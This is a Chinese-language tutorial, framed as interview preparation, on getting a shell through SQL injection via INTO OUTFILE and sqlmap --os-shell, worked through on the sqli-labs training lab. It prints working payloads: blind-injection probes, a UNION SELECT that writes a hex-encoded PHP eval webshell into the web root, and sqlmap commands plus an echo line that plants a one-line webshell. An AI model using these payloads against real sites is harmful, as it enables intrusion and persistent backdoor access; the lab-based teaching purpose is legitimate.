## 前言

前段时间，hvv和找实习的师傅们也多了起来。而我也不例外，尝试投递了不少简历，结果是积累了大量的面试经验。笔者发现大量的hr面试官都喜欢从SQL注入开始询问，所以留心了一下关于SQL注入的问题的频率。结果非常amazing啊！不出意外的是
--os-shell名列榜首。

比如这道题我都遇见不下三次：SQL注入getshell的方式？

> 答：getshell是指攻击者通过利用SQL注入获取系统权限的方法，Webshell提权分两种：一是利用 **outfile函数** ，另外一种是利用
> **\--os-shell** ；UDF提权通过堆叠注入实现；MOF提权通过"条件竞争"实现

小提示：有sql注入试着––is–dba，如果有有绝对路径就––os–shell，不行扫后台，尝试用管理员账户密码登录

## Webshell提权

### 一、 into outfile

into outfile利用的 **先决条件：**

> web目录具有写权限，能够使用单引号
>
> 知道网站绝对路径（根目录，或则是根目录往下的目录都行）
>
> secure_file_priv没有具体值（ **在mysql/my.ini中查看** ）

`secure_file_priv`：secure_file_priv是用来限制load 、dumpfile、into
outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。

关于secure_file_priv的配置介绍：

> secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
>
> 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
>
> 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

所以如果我们要想使用into outfile函数写入一句话就需要将secure_file_priv 的值设为没有值，那如何设置呢？

> 答：（1）看secure-file-priv参数的值：show global variables like
> '%secure%';若secure_file_priv 的值默认为NULL，则表示限制mysqld 不允许导入|导出
>
> （2）修改secure_file_priv 的值：我们可以在mysql/my.ini中查看是否有secure_file_priv
> 的参数，如果没有的话我们就添加 secure_file_priv = ' '
> 即可；此时再查看secure_file_priv的值如下已经变为空了，设置完成后我们就可以利用这个函数来写入一句话木马

### 写入webshell（以sqli-labs第七关为例）

  1.  **注入点判断![1653298693_628b56059104482febaa7.png!small](https://image.3001.net/images/20220523/1653298693_628b56059104482febaa7.png!small)**

因为我们发现输入正确/错误的语法显示说语法正确/错误，即页面只存在两种状态，判断为盲注。我们输入如下代码时，所以我们通过输入如下代码可以，通过回显获得情报！

> ?id=1’)) – -
我们继续测试

> ?id=3')) and sleep(5) --+

![1653299760_628b5a30d34a8f25bdaab.png!small?1653299761283](https://image.3001.net/images/20220523/1653299760_628b5a30d34a8f25bdaab.png!small?1653299761283)

我们发现成功延时，所以注入点就为1'))，我们输入的字符被包含在单引号中，且单引号外有两个双引号包裹；最终根据显示出"你在......使用outfile......"这个提示；我们就找到了他要是使用SQL注入"一句话木马"达到getshll的目的

  2. 判断列数![1653300311_628b5c57503ba5aec0021.png!small?1653300311710](https://image.3001.net/images/20220523/1653300311_628b5c57503ba5aec0021.png!small?1653300311710)

 **补充** ：我们使用order by 语句判断列数，order by 3时，正常显示，4时不正常，判断为3列

  3. 写入webshell![1653300960_628b5ee09704fa119d2f1.png!small?1653300961042](https://image.3001.net/images/20220523/1653300960_628b5ee09704fa119d2f1.png!small?1653300961042)

  * 加如此前我们已经通过一些方法获取到了网站的根目录，则可以写入一句话：`<?php eval($_REQUEST[123]);?> `；建议进行[十六进制转码](https://www.sojson.com/hexadecimal.html)（不用编码也可以）编码后在最前面加上0X；最后我们将一句话木马进行十六进制编码后写入了根目录下的outfile.php文件中
  * `?id=-3')) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\xxxxxx\phpStudy\WWW\outfile.php' --+`

 **补充**
：这里网站的目录要使用双斜杠不然会写不进去，第一个斜杠是转义的意思，字符串解析不仅仅局限于C编译器，Java编译器、一些配置文件的解析、Web服务器等等，都会遇到对字符串进行解析的这个问题，由于传统的
Windows采用的是单个斜杠的路径分隔形式，导致在对文件路径进行解析的时候可能发生不必要的错误，所以就出现了用双反斜杠""分隔路径的形式；不管解析引擎是否将反斜杠解析成转义字符，最终在内存中得到的都是""的形式，结果也就不会出问题了

  4. 连接webshell

补充：如果我们将 secure_file_priv的值为设置为null，我们在进行上面的写入操作发现并没有写进去原因如下：所以没有写进去的情况有两种：
**1.网站的路径不对，或者没有使用双斜杠进行转义；2.secure_file_priv的值不是为空**

###

## 二、-os-shell原理

–os-shell 大致原理是将脚本插入到数据库（也可以是日志）中，然后生成相应的代码文件，获取shell即可执行命令；--os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件

 **利用条件**

> 要求为DBA数据库管理员权限（--is-dba：phpstudy搭建的一般为DBA）
>
> php主动转义的功能关闭（PHP的GPC关闭），能使用单双引号（需要单引号路径，不能使用0x编码）
>
> 知道网站的绝对路径；文件不能覆盖写入，所以文件必须为不存在

`–secure-file-priv`没有值（该函数是能否执行-0s-shell的关键）：`–secure-file-priv`是mysql5.7+的新参数,用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录

  * secure_file_priv 为 NULL 时，说明限制mysqld不允许导入或导出
  * secure_file_priv 为 /tmp 时，说明限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行
  * secure_file_priv 没有值时，说明不限制mysqld在任意目录的导入导出

 **补充** ：secure_file_priv 参数是只读参数，不能使用set global命令修改,需要在my.cnf 或
my.ini，加入secure_file_priv=''后重启Mysql

    
    
    sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）
    
    tmpbeewq.php 用来执行系统命令
    
    tmpuqvgw.php 用来上传文件
    
    secure_file_priv没有具体值（在mysql/my.ini中查看）
    
    magic_quotes_gpc:（PHP magic_quotes_gpc作用范围是：WEB客户服务端；作用时间：请求开始时）

## 使用Sqlmap实现步骤

    
    
    1.弱口令登录  
    2.抓包  
    3.复制抓包的内容，保存为Alogin.txt（txt文件）到sqlmap目录下  
    4.启动sqlmap：sqlmap -r OAlogin.txt --os-shell  
    5.选择语言(ASP，ASPX，JSP，PHP)  
    6.输入绝对路径  
    7.写木马文件
      7.1：pwd //查看当前路径
      7.2：echo '<?php @eval($_POST['a']); ?>'>> 123.php  //将木马写入123.php
      7.3：cat 123.php //打印123.php文件的内容  
    8.用webshell连接

## 路径（dns外带查询）问题

产生路径问题的原因是什么？

>
> 答：对于大多数sql注入的写Shell方式而言,网站的绝对的路径都是需要知道的,这里需要知道的原因绝不是因为outfile相对路径无法写shell,而是因为不知道路径,webshell无法连接且通过相对路径的方式写出来的shell大概率是无法执行的,或者是权限不够写

 **dnslog注入** ：即，dns带外查询是属于Mysql注入的一种方法，可以通过查询相应的dns解析记录，来获取我们想要的数据

![](https://image.3001.net/images/20220523/1653301730_628b61e21b505a3c118c0.png!small)

为什么需要它的帮忙？

>
> 答：一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度。

LOAD_FILE()函数：LOAD_FILE()函数读取一个文件并将其内容作为字符串返回

语法为：load_file(file_name)，其中file_name是文件的完整路径

该函数需要满足的条件（如下所示）：

    
    
    1.文件必须位于服务器主机上
    
    2.你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关
    
    3.文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节

## 小结

本次分享就到此为止了，谢谢大家观看！下篇将分析UDF提权与MOF提权的利与弊；希望大家喜欢。

参考的文章链接：

sqli-labs-master
第七关详解：[地址﻿](https://blog.csdn.net/weixin_39464539/article/details/124609786)

sqlmap --os-shell执行原理（mysql篇）：[地址](http://t.zoukankan.com/Xiaoming0-p-13951894.html)

sqlmap —— os-shell参数分析：[地址](https://blog.csdn.net/qq_43531669/article/details/120630864)

